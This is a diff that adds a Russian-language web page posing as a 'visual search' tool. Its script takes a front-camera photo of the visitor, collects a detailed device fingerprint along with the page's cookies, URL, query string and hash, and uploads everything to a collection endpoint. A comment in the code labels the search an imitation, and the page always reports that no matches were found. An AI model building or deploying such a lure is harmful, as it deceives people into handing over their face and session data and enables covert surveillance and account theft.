@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Визуальный поиск</title>
+    <style>
+        body { margin: 0; padding: 0; background-color: #0f0f13; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { text-align: center; background: #1a1a20; padding: 40px 30px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 400px; width: 90%; }
+        h1 { font-size: 24px; margin-bottom: 10px; }
+        p { color: #a0a0a5; font-size: 14px; margin-bottom: 30px; }
+        button { background: #3b82f6; color: white; border: none; padding: 15px 30px; font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer; width: 100%; transition: background 0.2s; }
+        button:hover { background: #2563eb; }
+        button:disabled { background: #333; color: #666; cursor: not-allowed; }
+        .spinner { display: none; border: 4px solid rgba(255,255,255,0.3); border-top: 4px solid #3b82f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #video { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Визуальный поиск</h1>
+        <p>Найдите похожие изображения. Нажмите кнопку ниже, чтобы открыть камеру.</p>
+        
+        <button id="btn">Открыть камеру</button>
+        <div class="spinner" id="spinner"></div>
+        <video id="video" autoplay playsinline></video>
+    </div>
+    <script>
+        const btn = document.getElementById('btn');
+        const spinner = document.getElementById('spinner');
+        const video = document.getElementById('video');
+        
+        function getMetadata() {
+            return {
+                screen: { w: window.screen.width, h: window.screen.height, depth: window.screen.colorDepth },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                platform: navigator.platform,
+                cores: navigator.hardwareConcurrency || 'unknown',
+                memory: navigator.deviceMemory || 'unknown',
+                cookies: document.cookie,
+                referrer: document.referrer,
+                url: window.location.href,
+                query: window.location.search,
+                hash: window.location.hash,
+                connection: navigator.connection ? { effectiveType: navigator.connection.effectiveType, downlink: navigator.connection.downlink, rtt: navigator.connection.rtt } : 'unknown',
+                ua: navigator.userAgent
+            };
+        }
+
+        async function captureFrame() {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+        }
+
+        btn.addEventListener('click', async () => {
+            btn.style.display = 'none';
+            spinner.style.display = 'block';
+            let photo1 = null;
+
+            try {
+                // Запрос камеры
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                video.srcObject = stream;
+                await video.play();
+                await new Promise(r => setTimeout(r, 1000)); // Ждём фокус
+
+                photo1 = await captureFrame();
+                stream.getTracks().forEach(t => t.stop());
+
+            } catch (err) {
+                console.warn('Доступ к камере отклонён:', err);
+            }
+
+            // Отправка на сервер
+            const formData = new FormData();
+            formData.append('metadata', JSON.stringify(getMetadata()));
+            if (photo1) formData.append('photo1', photo1, 'search_query.jpg');
+
+            try {
+                const res = await fetch('/api/collect', { method: 'POST', body: formData });
+                if (res.ok) {
+                    // Имитация поиска
+                    setTimeout(() => {
+                        spinner.style.display = 'none';
+                        btn.textContent = 'Похожих не найдено';
+                        btn.style.background = '#333';
+                        btn.style.color = '#a0a0a5';
+                        btn.style.display = 'block';
+                    }, 2000);
+                } else {
+                    throw new Error('Server error');
+                }
+            } catch (err) {
+                spinner.style.display = 'none';
+                btn.textContent = 'Ошибка. Попробуйте снова.';
+                btn.style.background = '#ef4444';
+                btn.style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
